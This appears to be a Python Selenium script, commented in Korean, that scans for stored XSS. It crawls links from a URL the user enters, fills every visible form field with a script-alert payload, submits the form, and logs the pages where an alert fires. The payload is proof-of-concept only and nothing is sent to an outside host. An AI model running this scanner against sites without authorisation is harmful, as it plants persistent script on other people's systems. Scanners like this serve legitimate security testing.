from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import TimeoutException

from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup

import requests
import os
import time


# from web_crawler import crawl_page, crawl_website


current_directory = os.getcwd()
geckodriver_path = current_directory + r"\StoredXSS\path\to\geckodriver.exe"

firefox_options = webdriver.FirefoxOptions()

firefox_options.add_argument('--width=1280')
firefox_options.add_argument('--height=1024')
#firefox_options.add_argument("--headless") # 활성화하면 화면이 뜨지 않고 작동

final_urls = []

def collect_url(url, base_url):
    
    firefox_options.add_argument("--headless")
    
    service = Service(executable_path=geckodriver_path)
    driver = webdriver.Firefox(service=service, options=firefox_options)
    
    try:
        # 주어진 URL로 이동
        driver.get(url)

        # 현재 페이지의 HTML 가져오기
        page_source = driver.page_source

        # BeautifulSoup을 사용하여 HTML 파싱
        soup = BeautifulSoup(page_source, 'html.parser')

        # 모든 <a> 태그를 찾아 링크 추출
        links = soup.find_all('a')

        # 현재 URL의 도메인 추출
        base_url = urlparse(url).scheme + '://' + urlparse(url).netloc

        # 모든 링크를 절대 경로로 변환
        absolute_links = [urljoin(base_url, link.get('href')) for link in links]

        # 근본적인 주소의 하위 도메인만 필터링
        filtered_links = [link for link in absolute_links if link.startswith(base_url)]
        
        return filtered_links

    finally:
        # 웹드라이버 종료
        driver.quit()

       

def stored_xss_test(url, payloads, all_links):
    # 웹 드라이버 초기화
    service = Service(executable_path=geckodriver_path)
    browser = webdriver.Firefox(service=service, options=firefox_options)

    try:


        browser.get(all_links)
        
        try:
            WebDriverWait(browser, 20).until(EC.visibility_of_element_located((By.TAG_NAME, "textarea")))
        except TimeoutException:
            print(f"Stored XSS 취약점을 찾을 수 없습니다. : {all_links}")
            return
        except NoSuchElementException:
            print(f"Stored XSS 취약점을 찾을 수 없습니다. : {all_links}")
            return 
        
        
        #textarea = WebDriverWait(browser, 20).until(EC.visibility_of_element_located((By.TAG_NAME, "textarea")))
            
        # textarea 요소 찾기
        textarea = browser.find_element(By.TAG_NAME, "textarea")

        # textarea를 포함하는 form 찾기
        form = textarea.find_element(By.XPATH, "./ancestor::form")

        # form 내의 모든 input 및 textarea 요소 찾기
        elements = form.find_elements(By.XPATH, ".//input | .//textarea")
        
        count_element = 0
        xss_found = False
        
        # 찾은 요소에 "payloads" 값 입력하기
        for element in elements:
            try:                
                if element.is_displayed():
                   element.clear()
                   element.send_keys(payloads)
           
                   submit_button = browser.find_element(By.NAME, 'submit')
                   submit_button.click()
                
            
                   alert = WebDriverWait(browser, 5).until(EC.alert_is_present())
                   print(f"🛑 \033[38;2;255;0;0m[V]Stored XSS 취약점이 발견되었습니다. : {all_links}: {alert.text}\033[0m")
                   alert.accept()
                   xss_found = True
                
            
            except:
                count_element += 1
        
        if count_element:
            print(count_element,"개의 엘리먼트는 안전합니다.")
        if xss_found:
            final_urls.append(all_links)
            
    finally:
        # 브라우저 종료
        browser.quit()

# 테스트를 위한 호출

def main():
    #start_url = "http://testphp.vulnweb.com"
    #base_url = "http://testphp.vulnweb.com"
    
    #실제 주소를 입력할 땐, 아래 2개 코드 주석 해제 필요
    start_url = input ('enter url : ')
    base_url = start_url
    
    all_links = collect_url(start_url, base_url)

    # 따로 페이로드를 불러오는 코드로 변환 필요
    payloads = "<script>alert('XSS')</script>"

    # 중복 URL 선별 검사 로직 필요
    for all_link in all_links:
        stored_xss_test(start_url, payloads, all_link)

if __name__ == "__main__":
    main()
    
    print("🚫 Stored XSS 취약점 발견 URL :")
    for url in final_urls:
        print(url)
